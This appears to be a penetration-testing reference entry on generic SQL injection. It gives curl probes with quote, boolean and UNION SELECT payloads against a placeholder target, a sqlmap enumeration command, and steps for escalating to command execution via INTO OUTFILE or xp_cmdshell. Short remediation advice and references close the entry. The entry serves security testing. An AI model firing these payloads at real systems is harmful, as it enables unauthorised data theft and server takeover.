---
title: General SQL injection techniques (error-based / UNION / stacked queries)
cve: None (implementation flaw)
severity: critical
cvss: 9.1
product: Any endpoint that uses SQL queries
versions: Any
ports: 80, 443
keywords: sqli, sql injection, union, error-based, stacked queries, sqlmap
entry: Numeric/string parameters
verified: false
sources: Compiled from public sources (implementation flaws)
---

## Fingerprinting

- A numeric parameter such as `?id=1` returns details; adding a quote causes an error or changes the page;
- Sorting/filtering parameters (`sort=id`) are concatenated into SQL.

## Prerequisites

- Parameters reach SQL without parameterization.

## PoC

```bash
# 1) Boolean/error-based checks
curl -s 'https://target/api/user?id=1' | head -c 100
curl -s "https://target/api/user?id=1'" | head -c 200     # Error = possible injection
curl -s "https://target/api/user?id=1%20and%201=1" | head -c 100
curl -s "https://target/api/user?id=1%20and%201=2" | head -c 100   # Difference between responses = boolean-based injection

# 2) Retrieve data with UNION (determine the column count first)
for n in 1 2 3 4 5; do
  echo "cols=$n"; curl -s "https://target/api/user?id=1%20order%20by%20$n" | head -c 60; echo
done
curl -s "https://target/api/user?id=-1%20union%20select%201,2,3,4" | head -c 200
# Result: 2/3 appears on the page = columns are reflected

# 3) Run an all-in-one check
sqlmap -u 'https://target/api/user?id=1' --batch --dbs --level 2 --risk 2
```

## Exploitation Steps

1. Confirm using boolean response differences first;
2. Determine the column count → retrieve database/table names with UNION;
3. If RCE is needed, check privileges (MySQL `INTO OUTFILE`, MSSQL `xp_cmdshell`);
4. Evidence: response differences for two distinct conditions + the retrieved database name.

## Remediation and Mitigation

- Parameterize all queries; prohibit concatenation in ORM queries; apply least privilege to database accounts.

## References

- OWASP SQL Injection; CWE-89.
